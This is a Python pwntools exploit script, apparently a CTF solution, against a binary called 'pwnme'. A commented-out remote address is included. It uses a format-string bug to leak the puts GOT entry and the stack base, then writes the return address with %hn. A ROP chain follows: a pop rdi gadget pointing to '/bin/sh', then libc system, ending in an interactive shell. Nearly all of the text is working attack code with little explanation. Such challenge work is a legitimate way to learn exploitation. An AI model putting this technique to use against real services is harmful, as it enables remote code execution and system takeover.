from pwn import *
import StringIO

context.log_level = 'debug'
#context.aslr = False

io = process('./pwnme')
#io = remote('106.75.84.74', 10001)

e = ELF('./pwnme')
libc = e.libc

def com_gadet(func_ptr, arg1=0, arg2=0, arg3=0):
	addr1 = 0x0400EC6
	addr2 = 0x0400EB0
	payload = ''
	payload += p64(addr1) 
	payload += 'A' * 8       # add     rsp, 8
	payload += p64(0x0)      # rbx = 0
	payload += p64(0x1)      # rbp = 1
	payload += p64(func_ptr) # r12
	payload += p64(arg3)     # r13 = rdx = arg3
	payload += p64(arg2)     # r14 = rsi
	payload += p64(arg1)     # r15d = edi
	payload += p64(addr2)    # call *func_ptr
	payload += 'A'* 8 * 7    
	return payload

def answer(recv_buf, send_buf, newline= True):
	io.recvuntil(recv_buf)
	if newline:
		io.sendline(send_buf)
	else:
		io.send(send_buf)

'''
.text:0000000000400A6A                 mov     edx, 5          ; nbytes
.text:0000000000400A6F                 mov     rsi, rax        ; buf
.text:0000000000400A72                 mov     edi, 0          ; fd
.text:0000000000400A77                 call    read
.text:0000000000400A7C                 lea     rax, [rbp+buf]
.text:0000000000400A80                 mov     rdi, rax        ; nptr
.text:0000000000400A83                 call    atol
.text:0000000000400A88                 mov     [rbp+var_4], eax
.text:0000000000400A8B                 mov     eax, [rbp+var_4]
.text:0000000000400A8E                 leave
.text:0000000000400A8F                 retn


.text:00000000004008D5                 mov     rdi, rax        ; stream
.text:00000000004008D8                 call    fflush
.text:00000000004008DD                 mov     edx, 28h        ; nbytes
.text:00000000004008E2                 lea     rsi, [rbp+name] ; buf
.text:00000000004008E6                 mov     edi, 0          ; fd
.text:00000000004008EB                 call    read
.text:00000000004008F0                 mov     [rbp+var_1], al
.text:00000000004008F3                 cmp     [rbp+var_1], 0
.text:00000000004008F7                 jz      short loc_4008FF
'''

def edit(name, passwd, newline= True):
	answer('>', '2')
	answer('20):', name, newline)
	answer('20):', passwd, newline)

def show():
	answer('>', '1')


answer('40):', 'C'*20+'D'*20, False)
answer('40):', 'A'*20+'B'*20, False)

# ------------ leak puts
puts_got = 0x601FA8
atol_got = 0x601FF8

name = '%11$s'
passwd = 'A'*4 + p64(puts_got)

edit(name, passwd)

show()
buf = io.read(6)
buf = buf.ljust(8,'\x00')
puts_addr = u64(buf)

log.success('puts:%#x'%puts_addr) # remote puts:0x7fc1de90d9f0
libc.address = puts_addr - libc.symbols['puts']


# --------------- overwrite retaddr

edit('%6$p', 'BBBB') # print ebp
show()
buf = io.recvline()
ebp_addr = int(buf,16)
log.success("ebp=%#x" % ebp_addr)
ret_addr = ebp_addr - 0xe0 + 0xa8

overwrite_addr = ret_addr + 0x10

high_addr = ret_addr + 2
low_addr = ret_addr

# 00400B38  read buf
name = '%'+str(0xb38)+'c%11$hn\n'
passwd = 'A'*4 +p64(low_addr)+p64(overwrite_addr)
edit(name, passwd, False)

#gdb.attach(io, "b *0x00400ADE") # break on printf
#gdb.attach(io, "b *0x400af6") # on ret
#gdb.attach(io)
sleep(1)

show()

bss = 0x0602029
buf='AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAnAASAAoAATAApAAUAAqAAVAArAAWAAsAAXAAtAAYAAuAAZAAvAAwAAxAAyAAzA%%A%sA%BA%$A%nA%CA%-A%(A%DA%;A%)A%EA%aA%0A%FA%bA%1A%GA%cA%2A%HA%dA%3A%IA%eA%4A%JA%fA%5A%KA%'

read_got = 0x00601FC8
pop_rdi_ret = 0x0000000000400ed3 # pop rdi ; ret

buf = ''
buf += 'AAA'

buf += p64(bss) + '/bin/sh\x00' + 'A'*(40-8)
#buf += com_gadet(read_got, arg1=0, arg2=bss, arg3=11)
buf += p64(pop_rdi_ret) + p64(overwrite_addr+72)
buf += p64(libc.symbols['system'])
buf += ' '*0x40
buf += '/bin/sh;               '
io.send(buf)

io.interactive()

